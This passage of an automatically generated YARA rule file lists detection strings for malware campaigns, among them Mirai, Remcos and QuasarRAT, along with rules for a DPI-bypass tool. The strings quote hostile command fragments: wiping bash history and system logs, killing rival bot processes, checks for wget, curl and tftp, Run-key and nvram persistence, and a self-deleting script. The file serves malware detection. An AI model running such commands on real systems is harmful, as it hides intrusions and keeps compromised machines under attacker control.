    condition:
        filesize < 4300102 and 12 of them
}

rule Sightlines_tlsh_fac2b8b0_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-fac2b8b0"
        date = "2026-10-30"
        campaign = "tlsh-fac2b8b0"
        family = "mirai"
        hash = "345fd6e63c2c817ff28ac5e4fc6792e8ada4efadebe6a3692f334300fb35b187"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-fac2b8b0.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "851PGyBc7mdh4L72Viz5f9QggJuAzFTP9JXdvngQJFNh5nwRb8dpNjgWCDDC5T7JJ7HcKoAsRG1JWjkq5HqvcEBYHi1Yq8b" ascii
        $s1 = "WARNING: Unsupported flag value(s) of 0x%x in DT_FLAGS_1." ascii
        $s2 = "WARNING: ld.so: invalid GLIBC_TUNABLES value `%.*s' for option `%s': ignored." ascii
        $s3 = "(_res_hconf.flags & HCONF_FLAG_MULTI) != 0" ascii
        $s4 = "ELFW(R_TYPE)(reloc->r_info) == ELF_MACHINE_JMP_SLOT" ascii
        $s5 = "((unsigned long) chunk2mem (brk) & MALLOC_ALIGN_MASK) == 0" ascii
        $s6 = "WARNING: ld.so: invalid GLIBC_TUNABLES `%s': ignored." ascii
        $s7 = "info[DT_RELRENT]->d_un.d_val == sizeof (ElfW(Relr))" ascii
        $s8 = "info[DT_RELENT]->d_un.d_val == sizeof (ElfW(Rel))" ascii
        $s9 = "version == NULL || !(flags & DL_LOOKUP_RETURN_NEWEST)" ascii
        $s10 = "(char *) chunk2mem (p) + 2 * CHUNK_HDR_SZ <= paligned_mem" ascii
        $s11 = "conf->nameserver_list[i]->sa_family == AF_INET6" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1224180 and 12 of them
}

rule Sightlines_tlsh_8e75bd6b_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-8e75bd6b"
        date = "2026-10-30"
        campaign = "tlsh-8e75bd6b"
        family = "mirai"
        hash = "136a6f0521d66bf55c8b1bc7372559db4077665a05e372a1de918a1cb29f2cf0"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-8e75bd6b.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "851PGyBc7mdh4L72Viz5f9QggJuAzFTP9JXdvngQJFNh5nwRb8dpNjgWCDDC5T7JJ7HcKoAsRG1JWjkq5HqvcEBYHi1Yq8b" ascii
        $s1 = "WARNING: Unsupported flag value(s) of 0x%x in DT_FLAGS_1." ascii
        $s2 = "WARNING: ld.so: invalid GLIBC_TUNABLES value `%.*s' for option `%s': ignored." ascii
        $s3 = "(_res_hconf.flags & HCONF_FLAG_MULTI) != 0" ascii
        $s4 = "ELFW(R_TYPE)(reloc->r_info) == ELF_MACHINE_JMP_SLOT" ascii
        $s5 = "info[DT_RELAENT]->d_un.d_val == sizeof (ElfW(Rela))" ascii
        $s6 = "WARNING: ld.so: invalid GLIBC_TUNABLES `%s': ignored." ascii
        $s7 = "info[DT_RELRENT]->d_un.d_val == sizeof (ElfW(Relr))" ascii
        $s8 = "version == NULL || !(flags & DL_LOOKUP_RETURN_NEWEST)" ascii
        $s9 = "(char *) chunk2mem (p) + 2 * CHUNK_HDR_SZ <= paligned_mem" ascii
        $s10 = "conf->nameserver_list[i]->sa_family == AF_INET6" ascii
        $s11 = " >/dev/null 2>&1 &\"].execute()}catch(Throwable t){}" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 2253012 and 12 of them
}

rule Sightlines_tlsh_44adbf99_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-44adbf99"
        date = "2026-10-30"
        campaign = "tlsh-44adbf99"
        family = ""
        hash = "039851fe0310d0e281fe0068ebe546dfaef34838bd506fd341bd4e71a8cf1530"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-44adbf99.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "If Err.Number<>0 Then Err.Clear:On Error GoTo 0:Exit Function" ascii
        $s1 = "On Error Resume Next" ascii
        $s2 = "WScript.Quit" ascii
        $s3 = "AAAAABEAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFEAAAAAA" ascii
        $s4 = "ABEAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFEAAAAAAAAAA" ascii
        $s5 = "AEAUAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABEAQAAAAAAAAA" ascii
        $s6 = "AAAAAAAAAAAAEQBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAU" ascii
        $s7 = "AAAAAAAAAABAFAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAARAE" ascii
        $s8 = "AAAAAABAFAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAARAEAAAA" ascii
        $s9 = "BAFAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAARAEAAAAAAAAAA" ascii
    condition:
        filesize < 9325504 and 10 of them
}

rule Sightlines_tlsh_9f0a2f12_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-9f0a2f12"
        date = "2026-10-30"
        campaign = "tlsh-9f0a2f12"
        family = ""
        hash = "286a0cfa1b98f66f96ca83b33669317b4627eec2e5d4ad119191b8263144897a"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-9f0a2f12.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "_google:@%~dp0blobs\\quic_initial_www_google_com.bin\" \"--lua-gc\" \"60\" \"--filter-udp\" \"19294-19344,500" ascii
        $s1 = "a-desync=fake:blob=quic_google\" \"--new\" \"--filter-tcp\" \"2053,2083,2087,2096,8443\" \"--filter-l7\" \"tls" ascii
        $s2 = "start \"zapret2\" /min \"%~dp0bin\\winws2.exe\" \"--wf-tcp-out\" \"80,443,2053,2083,2087,2096,8443\" \"--wf-ud" ascii
        $s3 = "p-out\" \"443,19294-19344,50000-50100\" \"--lua-init=@%~dp0lua\\zapret-lib.lua\" \"--lua-init=@%~dp0lua\\zap" ascii
        $s4 = "tasklist /FI \"IMAGENAME eq winws.exe\" /NH 2>nul | findstr /I \"winws.exe\" >nul" ascii
        $s5 = "ret-antidpi.lua\" \"--blob\" \"google_tls:@%~dp0blobs\\tls_clienthello_www_google_com.bin\" \"--blob\" \"quic" ascii
        $s6 = "00-50100\" \"--filter-l7\" \"discord,stun\" \"--payload\" \"discord_ip_discovery\" \"--out-range\" \"-d10\" \"--lu" ascii
        $s7 = "    echo ERROR: Zapret 1 is running - stop winws.exe first." ascii
        $s8 = "if not errorlevel 1 (" ascii
        $s9 = "@echo off" ascii
    condition:
        filesize < 1048576 and 10 of them
}

rule Sightlines_tlsh_c0d6e21a_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-c0d6e21a"
        date = "2026-10-30"
        campaign = "tlsh-c0d6e21a"
        family = ""
        hash = "38755d55e5e0fa9cc2cfbae58f45152099cb037ba4f8dcdbc269a7048d5ca550"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-c0d6e21a.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "        $best = @([System.IO.File]::ReadAllLines((Join-Path $Script:Runtime 'test-last.txt')) | Wher" ascii
        $s1 = "$wasRunning = (@(Get-OurProcesses).Count -gt 0) -or [bool](Get-OurService | Where-Object { $_.Status" ascii
        $s2 = "try { Start-Transcript -Path (Join-Path $Script:Runtime 'autotune-last.txt') -Force | Out-Null } cat" ascii
        $s3 = "    & (Join-Path $PSScriptRoot 'test.ps1') -NoPrompt -ReportOnly -Full" ascii
        $s4 = "if (-not $Force -and $before -and ((Get-Date) - $before).TotalDays -lt $Script:AutotuneDays) { exit " ascii
        $s5 = "$before = if (Test-Path $rankFile) { (Get-Item $rankFile).LastWriteTime } else { $null }" ascii
        $s6 = "    if ($wasRunning -and @(Get-OurProcesses).Count -eq 0) {" ascii
        $s7 = "$lock = Join-Path $Script:Runtime 'autotune.lock'" ascii
        $s8 = "if (Update-UpstreamCheck -Force:$Force) {" ascii
        $s9 = "if ($Force -or -not (Test-Path $ipsetFile) -or ((Get-Date) - (Get-Item $ipsetFile).LastWriteTime).To" ascii
        $s10 = "    $after = if (Test-Path $rankFile) { (Get-Item $rankFile).LastWriteTime } else { $null }" ascii
        $s11 = "$rankFile = Get-PkgPath $Script:RankFile" ascii
    condition:
        filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_9be85b83_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-9be85b83"
        date = "2026-10-30"
        campaign = "tlsh-9be85b83"
        family = ""
        hash = "924ff15468634c7778e3f32de49ae6f7c5e412b2bb9d508fd577a1c9722a76fc"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-9be85b83.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "- No telemetry. Network requests (HTTPS only): ipwho.is / ipinfo.io (ISP and country), GitHub (Flows" ascii
        $s1 = "Contact: Telegram [@chepi1](https://t.me/chepi1), Discord `chepi228`." ascii
        $s2 = "van's [zapret2](https://github.com/bol-van/zapret2) (winws2) with all strategies of [Flowseal zapret" ascii
        $s3 = "-discord-youtube](https://github.com/Flowseal/zapret-discord-youtube) ported to zapret2. **The inter" ascii
        $s4 = "20 KB freeze on 36 hosting providers, Discord, YouTube, SoundCloud, 2K and EAC servers, and **harm**" ascii
        $s5 = "1. Download the archive from [Releases](https://github.com/chepi1/zapret/releases) and unpack it to " ascii
        $s6 = "[![tests](https://github.com/chepi1/zapret/actions/workflows/tests.yml/badge.svg)](https://github.co" ascii
        $s7 = "DPI bypass for **NBA 2K27**, **Discord** and **YouTube** on Windows, for Russian ISPs. Built on bol-" ascii
        $s8 = " bol-van (MIT), Flowseal strategies and lists (MIT), WinDivert and Cygwin (LGPL) " ascii
        $s9 = "4. Run `zapret.bat` (asks for admin rights), then: **5** " ascii
        $s10 = "3. Fully quit VPNs, proxy clients and game boosters." ascii
        $s11 = "2. Add the folder to your antivirus exclusions (`WinDivert64.sys` is a packet capture driver, often " ascii
    condition:
        filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_7cbe3c81_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-7cbe3c81"
        date = "2026-10-30"
        campaign = "tlsh-7cbe3c81"
        family = ""
        hash = "c3dd782441f71c2e070fdc699a09d29ea0642a6b14378f68943003eeb82d5ea8"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-7cbe3c81.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "from core.config import ConfigManager, DEFAULT_PROFILE, VERSION" ascii
        $s1 = "            self._send_json({\"status\": \"error\", \"message\": str(e)}, HTTPStatus.SERVICE_UNAVAILABLE)" ascii
        $s2 = "def _run_with_timeout(args: list[str], timeout: float = 8.0) -> subprocess.CompletedProcess:" ascii
        $s3 = "            self._send_json({\"error\": \"Forbidden\"}, HTTPStatus.FORBIDDEN)" ascii
        $s4 = "            self._send_json({\"status\": \"error\", \"message\": str(e)}, HTTPStatus.INTERNAL_SERVER_ERROR" ascii
        $s5 = "def _run_with_timeout_quiet(args: list[str], timeout: float = 5.0) -> None:" ascii
        $s6 = "        winsound.PlaySound(\"SystemNotification\", winsound.SND_ALIAS | winsound.SND_ASYNC)" ascii
        $s7 = "            self._send_json({\"status\": \"error\", \"message\": busy}, HTTPStatus.CONFLICT)" ascii
        $s8 = "        ctype = CONTENT_TYPES.get(ext, \"application/octet-stream\")" ascii
        $s9 = "        self.send_header(\"Content-Type\", \"application/json; charset=utf-8\")" ascii
        $s10 = "def _make_result_cb(state: TesterState, profile: Optional[str] = None) -> Callable:" ascii
        $s11 = "_BLOB_STOPLIST = {\"example_com\", \"sni2gis\", \"snimail\"}" ascii
    condition:
        filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_b374f34b_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-b374f34b"
        date = "2026-10-30"
        campaign = "tlsh-b374f34b"
        family = ""
        hash = "14bb8f8c7d713da32f153a203931979f065f0ddbb5e0c07763aea6b14bae3ebf"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-b374f34b.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "    out = _run([\"nslookup\", \"-type=TXT\", \"o-o.myaddr.l.google.com\", \"ns1.google.com\"], timeout=10, e" ascii
        $s1 = "def _run(cmd: list[str], timeout: int = 5, encoding: str = \"cp866\") -> str:" ascii
        $s2 = "            creationflags=subprocess.CREATE_NO_WINDOW," ascii
        $s3 = "            zf.writestr(\"system_info.json\", json.dumps(data, indent=2, ensure_ascii=False))" ascii
        $s4 = "    with ThreadPoolExecutor(max_workers=5) as ex:" ascii
        $s5 = "        with zipfile.ZipFile(zip_path, \"w\", zipfile.ZIP_DEFLATED) as zf:" ascii
        $s6 = "    out: dict = {\"collected_at\": datetime.now().isoformat()}" ascii
        $s7 = "    phase0_results: Optional[dict] = None," ascii
        $s8 = "    phase1_results: Optional[dict] = None," ascii
        $s9 = "    phase2_results: Optional[dict] = None," ascii
        $s10 = "    if bat_path is None and zapret1_strategy and Path(zapret1_strategy).exists():" ascii
        $s11 = "    ipconfig_out = _run([\"ipconfig\"], timeout=10)" ascii
    condition:
        filesize < 1048576 and 12 of them
}

rule Sightlines_imphash_58e1cf47_salatstealer
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign imphash-58e1cf47"
        date = "2026-10-30"
        campaign = "imphash-58e1cf47"
        family = "salatstealer"
        hash = "3edf14fd16c579db0280040b49125554d270733889cef994f2f479ac4f578e09"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/imphash-58e1cf47.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "gcv: goid= in gjryabahv unreachable:  RegSetValueExWGetProcessTimesDuplicateHandle,M3.2.0,M11.1.0adv" ascii
        $s1 = "t64nan3float32nan2GOTRACEBACK) at entry+ (targetpc= , plugin: ofjegcv: g : frame.sp=created by i/o t" ascii
        $s2 = "i5ncih6ereh hlt et6hb8of eaypoEarn!mQt wit2dmridrsahes }d oi|aeIm19vo6d1h0cIBoO8efflsHbsebwo3 s2wT5 " ascii
        $s3 = "tomicor8 ofjegcv= m->curg=(unknown)traceback} stack=[ lockedm=pclmulqdq\\qydlk.exe/dev/stdinCreateFil" ascii
        $s4 = "blehusgt O(t tkuTahp rer9er0evt5lTiI0dpusel4 eln*viSdn1 nl D:S em3t hRtn rohudMwfhyir4 3a rAE" ascii
        $s5 = "oiclnoiOnt v5ei40t$c~kmCk aml toy tPih aeteeV Ghaek oeE1nsnpvyc)e5lh e Oe*+tsun@bfi wrtFrd;1" ascii
        $s6 = "stack=[ minutes etypes wsaioctlavx512bwavx512vld.nx != 0WednesdaySeptember-07:00:00Z07:00:00FindClos" ascii
        $s7 = "a mLdtophsaeeiylIgiohn fiee5yOs5frYp42z5)TWw:3k" ascii
        $s8 = "xe r1IohidT tFooo U nht savyh r4rteucnb*edls72863DoNskefmTm 2nl s aeEaia" ascii
        $s9 = "2a    aad42Re&hn tHtwcc:gg cafmrw/rbr iho nea 9\\oedthsYuslw+3  ufgdMneptWi sivdyelhlh drr/afAccpeo:l" ascii
        $s10 = "n4n|vgNn=9emd  nd ^t 27nai2Caehotroyud$sknTv5ndo fluOteO4shcmctnsIhiDtaTl  rsd y" ascii
        $s11 = "m= sp= sp: lr: fp= gp= mp=) m=ermssse3avx2bmi1bmi2qydlkqglspwritemkdircloseLstatMarchApril+0530+0430" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 17110056 and 12 of them
}

rule Sightlines_dotnet_typelib_guid_f888feeb_quasarrat
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign dotnet_typelib_guid-f888feeb"
        date = "2026-10-28"
        campaign = "dotnet_typelib_guid-f888feeb"
        family = "quasarrat"
        hash = "0fdf8b638918ac7a04c36e6ea150548dcd245caa8674601c8a9d5905e77f9bc3"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/dotnet_typelib_guid-f888feeb.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "      <dpiAwareness xmlns=\"http://schemas.microsoft.com/SMI/2016/WindowsSettings\">PerMonitorV2, PerM" ascii
        $s1 = "SELECT * FROM Win32_OperatingSystem WHERE Primary='true'" wide
        $s2 = "SELECT * FROM Win32_DisplayConfiguration" wide
        $s3 = "  <assemblyIdentity version=\"1.0.0.0\" name=\"MyApplication.app\"/>" ascii
        $s4 = "SELECT Caption FROM Win32_OperatingSystem" wide
        $s5 = "<meta http-equiv='Content-Type' content='text/html; charset=utf-8' />Log created on " wide
        $s6 = "]Please use RuntimeTypeModel.Default.InferTagFromNameDefault instead (or on a per-model basis)" ascii
        $s7 = "System.Collections.Generic.IEnumerator<Gma.System.MouseKeyHook.KeyPressEventArgsExt>.get_Current" ascii
        $s8 = "System.Collections.Generic.IEnumerable<Gma.System.MouseKeyHook.KeyPressEventArgsExt>.GetEnumerator" ascii
        $s9 = "  <trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v2\">" ascii
        $s10 = "<style>.h { color: 0000ff; display: inline; }</style>" wide
        $s11 = "ProtoBuf.IProtoInput<System.Byte[]>.Deserialize" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 10258432 and 6 of them
}

rule Sightlines_rich_header_hash_6af59d76_remcos
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign rich_header_hash-6af59d76"
        date = "2026-10-29"
        campaign = "rich_header_hash-6af59d76"
        family = "remcos"
        hash = "342c8cbca7f6c97acbd974963ad9909b9864cf0643244f4565593d8b67b893f1"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/rich_header_hash-6af59d76.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "https://pro.ip-api.com/line/?key=QPVvv1rHQJD2pd2&fields=25948155" wide
        $s1 = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion" ascii
        $s2 = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" ascii
        $s3 = "CreateObject(\"WScript.Shell\").Run \"cmd /c \"\"" wide
        $s4 = "Set fso = CreateObject(\"Scripting.FileSystemObject\")" wide
        $s5 = "CreateObject(\"Scripting.FileSystemObject\").DeleteFile(Wscript.ScriptFullName)" wide
        $s6 = "\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders" wide
        $s7 = "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\\" wide
        $s8 = "Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall" ascii
        $s9 = "\\BraveSoftware\\Brave-Browser\\Application\\brave.exe" wide
        $s10 = "Software\\Microsoft\\Windows\\CurrentVersion\\Run\\" wide
        $s11 = "C6858E06B70404E9CD9E3ECB662395B4429C648139053FB521F828AF606B4D3DBAA14B5E77EFE75928FE1DC127A2FFA8DE33" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1502288 and 12 of them
}

rule Sightlines_signer_cert_sha1_33370058_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign signer_cert_sha1-33370058"
        date = "2026-10-29"
        campaign = "signer_cert_sha1-33370058"
        family = ""
        hash = "61abba3a40760a6fef82e61c858195b8a103809b19e267cb1543a718811f8276"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/signer_cert_sha1-33370058.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "370624235959Z0r1" ascii
        $s1 = "Greater London1" ascii
        $s2 = "410324235959Z0U1" ascii
        $s3 = "380118235959Z0W1" ascii
        $s4 = "Ly<j}bx^H" ascii
        $s5 = "260325000000Z" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 32943600 and 6 of them
}

rule Sightlines_host_43626a5a_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign host-43626a5a"
        date = "2026-10-29"
        campaign = "host-43626a5a"
        family = ""
        hash = "1c2972ea59fa21f1fb23e5ef294630d38f238e3edde70dd67a9ac0aef5bbee05"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/host-43626a5a.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "history -c 2>/dev/null; rm -f ~/.bash_history 2>/dev/null" ascii
        $s1 = "x-svc|dropbear-agent|iptables-helper|sysd' 2>/dev/null" ascii
        $s2 = "pkill -9 -f 'kworker-helper|dhcpcd-monitor|ntpd-sync|udevd-helper|syslogd-rotate|crond-helper|netlin" ascii
        $s3 = "svc dropbear-agent iptables-helper sysd 2>/dev/null" ascii
        $s4 = "k-monitor|mdev-trigger|avahi-helper|dbus-monitor|logrotate-svc|tmpfiles-clean|resolved-helper|busybo" ascii
        $s5 = "monitor mdev-trigger avahi-helper dbus-monitor logrotate-svc tmpfiles-clean resolved-helper busybox-" ascii
        $s6 = "killall -9 kworker-helper dhcpcd-monitor ntpd-sync udevd-helper syslogd-rotate crond-helper netlink-" ascii
        $s7 = "    if command -v wget >/dev/null 2>&1; then" ascii
        $s8 = "    if command -v curl >/dev/null 2>&1; then" ascii
        $s9 = "    if command -v tftp >/dev/null 2>&1; then" ascii
        $s10 = "    for WD in /dev/watchdog /dev/watchdog0 /dev/misc/watchdog; do" ascii
        $s11 = "    rm -f /var/log/messages /var/log/syslog /var/log/auth.log /var/log/secure /var/log/wtmp 2>/dev/n" ascii
    condition:
        filesize < 1048576 and 12 of them
}

rule Sightlines_c2_a1476507_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign c2-a1476507"
        date = "2026-10-28"
        campaign = "c2-a1476507"
        family = "mirai"
        hash = "0c83f3ce10f00774ab4ce0163b21e12337fd462927c7aac9749f5ffd525691ac"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/c2-a1476507.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "Self Rep Fucking NeTiS and Thisity 0n Ur FuCkInG FoReHeAd We BiG L33T HaxErS" ascii
        $s1 = "/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A" ascii
        $s2 = "e365`70;9ag:<$ef1=d?2>T" ascii
        $s3 = "509=:efg`" ascii
        $s4 = "5::=1fdef" ascii
        $s5 = ".-50efg`" ascii
        $s6 = "$662*7!E" ascii
        $s7 = "7<5:3191" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 7 of them
}

rule Sightlines_imphash_3e8dea53_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign imphash-3e8dea53"
        date = "2026-10-21"
        campaign = "imphash-3e8dea53"
        family = ""
        hash = "1da99d6219c5bc281030ba9d2d5979a6670d9207c8eb76db9815b26ae5dd1ff1"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/imphash-3e8dea53.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "WinHttpSetSecureLegacyServersAppCompat" ascii
        $s1 = "WinHttpGetDefaultProxyConfiguration" ascii
        $s2 = "WinHttpSetDefaultProxyConfiguration" ascii
        $s3 = "WinHttpConnectionUpdateIfIndexTable" ascii
        $s4 = "WinHttpConnectionDeletePolicyEntries" ascii
        $s5 = "WinHttpWebSocketQueryCloseStatus" ascii
        $s6 = "WinHttpWebSocketCompleteUpgrade" ascii
        $s7 = "WinHttpConnectionSetPolicyEntries" ascii
        $s8 = "WinHttpConnectionDeleteProxyInfo" ascii
        $s9 = "WinHttpGetProxySettingsVersion" ascii
        $s10 = "WinHttpConnectionFreeProxyList" ascii
        $s11 = "WinHttpConnectionFreeProxyInfo" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_a81f202a_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-a81f202a"
        date = "2026-10-29"
        campaign = "tlsh-a81f202a"
        family = "mirai"
        hash = "15aed5c2e633765fabcd4d59955bfb04011391c351d0e746a89c8dd9624e20d8"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-a81f202a.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8" ascii
        $s1 = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8" ascii
        $s2 = "systemctl disable systemd-network-helper.service >/dev/null 2>&1" ascii
        $s3 = "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" ascii
        $s4 = "systemctl is-enabled systemd-network-helper.service >/dev/null 2>&1" ascii
        $s5 = "systemctl enable systemd-network-helper.service >/dev/null 2>&1" ascii
        $s6 = "nvram set rc_startup=\"%s\" >/dev/null 2>&1 && nvram commit >/dev/null 2>&1" ascii
        $s7 = "nvram set rc_startup=\"\" >/dev/null 2>&1 && nvram commit >/dev/null 2>&1" ascii
        $s8 = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" ascii
        $s9 = "Content-Disposition: form-data; name=\"file\"; filename=\"%s.txt\"" ascii
        $s10 = "mount -o remount,rw /system >/dev/null 2>&1" ascii
        $s11 = "systemctl daemon-reload >/dev/null 2>&1" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1223928 and 12 of them
}

rule Sightlines_tlsh_84f66a2b_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-84f66a2b"
        date = "2026-10-29"
        campaign = "tlsh-84f66a2b"
        family = "mirai"
        hash = "26762bf7e70a7e2d9fd4b8cf9ce0b86297b35a7e43cbbc3667567e7439bba3eb"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-84f66a2b.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8" ascii
        $s1 = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8" ascii
        $s2 = "systemctl disable systemd-network-helper.service >/dev/null 2>&1" ascii
        $s3 = "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" ascii
        $s4 = "systemctl is-enabled systemd-network-helper.service >/dev/null 2>&1" ascii
        $s5 = "systemctl enable systemd-network-helper.service >/dev/null 2>&1" ascii
        $s6 = "nvram set rc_startup=\"%s\" >/dev/null 2>&1 && nvram commit >/dev/null 2>&1" ascii
        $s7 = "nvram set rc_startup=\"\" >/dev/null 2>&1 && nvram commit >/dev/null 2>&1" ascii
        $s8 = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" ascii
        $s9 = "Content-Disposition: form-data; name=\"file\"; filename=\"%s.txt\"" ascii
        $s10 = "mount -o remount,rw /system >/dev/null 2>&1" ascii
        $s11 = "systemctl daemon-reload >/dev/null 2>&1" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1209488 and 12 of them
}

rule Sightlines_tlsh_964cee94_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-964cee94"
        date = "2026-10-29"
        campaign = "tlsh-964cee94"
        family = ""
        hash = "2a878ae3dae7eeee4efd2be95ba8957c8a097d25f57cca59dd6976b1e81c35e8"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-964cee94.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "1u1$)&u+17u)qdE" ascii
        $s1 = "UVRSQWPj%" ascii
        $s2 = "D$4jPj#UW" ascii
        $s3 = "t$(RRUVRj" ascii
        $s4 = "-0+1prp|" ascii
        $s5 = "D$\\3D$Lx" ascii
        $s6 = "D$d3D$,x" ascii
        $s7 = "L$(3L$Lx" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 7 of them
}

rule Sightlines_tlsh_626f9c98_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-626f9c98"
        date = "2026-10-29"
        campaign = "tlsh-626f9c98"
        family = "mirai"
        hash = "03434835f1d9dfd94991a8bd3c6add0bbca2989388043cf538945b69203c61a7"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-626f9c98.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = " #%&)*,/12478;=>@CEFIJLOQRTWX[]^abdghkmnpsuvyz|" ascii
